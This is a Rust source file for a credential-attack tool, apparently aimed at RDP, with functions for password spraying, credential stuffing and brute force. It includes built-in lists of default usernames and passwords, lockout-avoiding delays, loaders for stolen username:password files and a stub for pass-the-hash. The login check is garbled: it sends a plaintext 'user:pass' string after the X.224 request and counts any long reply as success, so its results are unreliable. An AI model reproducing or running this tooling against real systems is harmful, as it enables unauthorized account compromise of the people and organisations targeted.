use std::net::TcpStream;
use std::time::Duration;
use std::io::{Read, Write};
use std::collections::HashMap;

/// Advanced credential testing capabilities
pub struct CredentialTester {
    pub timeout_ms: u64,
    pub max_attempts_per_user: u32,
    pub delay_between_attempts_ms: u64,
}

impl CredentialTester {
    pub fn new() -> Self {
        CredentialTester {
            timeout_ms: 3000,
            max_attempts_per_user: 3,
            delay_between_attempts_ms: 1000,
        }
    }
    
    /// Password spray attack - try one password against many users
    pub fn password_spray(
        &self,
        ip: &str,
        port: u16,
        users: &[String],
        password: &str,
    ) -> Vec<CredentialResult> {
        let mut results = Vec::new();
        
        for user in users {
            // Add delay to avoid lockouts
            std::thread::sleep(Duration::from_millis(self.delay_between_attempts_ms));
            
            let success = self.test_credential(ip, port, user, password);
            results.push(CredentialResult {
                username: user.clone(),
                password: password.to_string(),
                success,
                method: AuthMethod::PasswordSpray,
            });
            
            if success {
                break; // Stop on first success
            }
        }
        
        results
    }
    
    /// Credential stuffing - test known username:password pairs
    pub fn credential_stuffing(
        &self,
        ip: &str,
        port: u16,
        credentials: &[(String, String)],
    ) -> Vec<CredentialResult> {
        let mut results = Vec::new();
        
        for (username, password) in credentials {
            std::thread::sleep(Duration::from_millis(self.delay_between_attempts_ms));
            
            let success = self.test_credential(ip, port, username, password);
            results.push(CredentialResult {
                username: username.clone(),
                password: password.clone(),
                success,
                method: AuthMethod::CredentialStuffing,
            });
            
            if success {
                break; // Stop on first success
            }
        }
        
        results
    }
    
    /// Brute force attack with username and password lists
    pub fn brute_force(
        &self,
        ip: &str,
        port: u16,
        usernames: &[String],
        passwords: &[String],
    ) -> Vec<CredentialResult> {
        let mut results = Vec::new();
        let mut attempts_per_user: HashMap<String, u32> = HashMap::new();
        
        for username in usernames {
            let attempts = attempts_per_user.entry(username.clone()).or_insert(0);
            
            for password in passwords {
                if *attempts >= self.max_attempts_per_user {
                    break; // Avoid account lockout
                }
                
                std::thread::sleep(Duration::from_millis(self.delay_between_attempts_ms));
                
                let success = self.test_credential(ip, port, username, password);
                *attempts += 1;
                
                if success {
                    results.push(CredentialResult {
                        username: username.clone(),
                        password: password.clone(),
                        success: true,
                        method: AuthMethod::BruteForce,
                    });
                    break; // Move to next user
                }
            }
        }
        
        results
    }
    
    /// Test a single credential
    pub fn test_credential(&self, ip: &str, port: u16, username: &str, password: &str) -> bool {
        let addr = format!("{}:{}", ip, port);
        if let Ok(addr) = addr.parse() {
            if let Ok(mut stream) = TcpStream::connect_timeout(&addr, Duration::from_millis(self.timeout_ms)) {
                stream.set_read_timeout(Some(Duration::from_millis(self.timeout_ms))).ok();
                stream.set_write_timeout(Some(Duration::from_millis(self.timeout_ms))).ok();
                
                // X.224 Connection Request
                let x224_request: [u8; 19] = [
                    0x03, 0x00, 0x00, 0x13,
                    0x0e, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x01, 0x00, 0x08, 0x00,
                    0x00, 0x00, 0x00, 0x00,
                ];
                
                if stream.write_all(&x224_request).is_ok() {
                    let mut response = [0u8; 1024];
                    if let Ok(n) = stream.read(&mut response) {
                        if n > 11 && response[0] == 0x03 && response[5] == 0xd0 {
                            // Send auth attempt
                            let auth_data = format!("{}:{}", username, password);
                            let auth_bytes = auth_data.as_bytes();
                            
                            if stream.write_all(auth_bytes).is_ok() {
                                std::thread::sleep(Duration::from_millis(100));
                                let mut auth_response = [0u8; 512];
                                if let Ok(n) = stream.read(&mut auth_response) {
                                    // Check for success indicators
                                    if n > 0 && (auth_response[0] == 0x03 || n > 50) {
                                        return true;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        false
    }
    
    /// Test NTLM hash authentication (pass-the-hash)
    pub fn test_ntlm_hash(&self, ip: &str, port: u16, username: &str, ntlm_hash: &str) -> bool {
        // Placeholder for NTLM hash authentication
        // This would require implementing the full NTLM protocol
        // For now, return false
        false
    }
    
    /// Get common username list
    pub fn get_common_usernames() -> Vec<String> {
        vec![
            "administrator".to_string(),
            "admin".to_string(),
            "root".to_string(),
            "user".to_string(),
            "guest".to_string(),
            "test".to_string(),
            "backup".to_string(),
            "support".to_string(),
            "service".to_string(),
            "operator".to_string(),
        ]
    }
    
    /// Get common password list
    pub fn get_common_passwords() -> Vec<String> {
        vec![
            "password".to_string(),
            "Password1".to_string(),
            "P@ssw0rd".to_string(),
            "123456".to_string(),
            "password123".to_string(),
            "admin".to_string(),
            "admin123".to_string(),
            "Welcome1".to_string(),
            "Passw0rd!".to_string(),
            "qwerty".to_string(),
            "letmein".to_string(),
            "changeme".to_string(),
            "".to_string(), // Empty password
        ]
    }
    
    /// Load usernames from file
    pub fn load_usernames_from_file(path: &str) -> Result<Vec<String>, std::io::Error> {
        let content = std::fs::read_to_string(path)?;
        Ok(content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect())
    }
    
    /// Load passwords from file
    pub fn load_passwords_from_file(path: &str) -> Result<Vec<String>, std::io::Error> {
        let content = std::fs::read_to_string(path)?;
        Ok(content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect())
    }
    
    /// Load credential pairs from file (format: username:password)
    pub fn load_credentials_from_file(path: &str) -> Result<Vec<(String, String)>, std::io::Error> {
        let content = std::fs::read_to_string(path)?;
        let mut credentials = Vec::new();
        
        for line in content.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }
            
            if let Some((user, pass)) = line.split_once(':') {
                credentials.push((user.to_string(), pass.to_string()));
            }
        }
        
        Ok(credentials)
    }
}

impl Default for CredentialTester {
    fn default() -> Self {
        Self::new()
    }
}

#[derive(Debug, Clone)]
pub struct CredentialResult {
    pub username: String,
    pub password: String,
    pub success: bool,
    pub method: AuthMethod,
}

#[derive(Debug, Clone, PartialEq)]
pub enum AuthMethod {
    BruteForce,
    PasswordSpray,
    CredentialStuffing,
    NtlmHash,
}

impl std::fmt::Display for AuthMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            AuthMethod::BruteForce => write!(f, "Brute Force"),
            AuthMethod::PasswordSpray => write!(f, "Password Spray"),
            AuthMethod::CredentialStuffing => write!(f, "Credential Stuffing"),
            AuthMethod::NtlmHash => write!(f, "NTLM Hash (Pass-the-Hash)"),
        }
    }
}
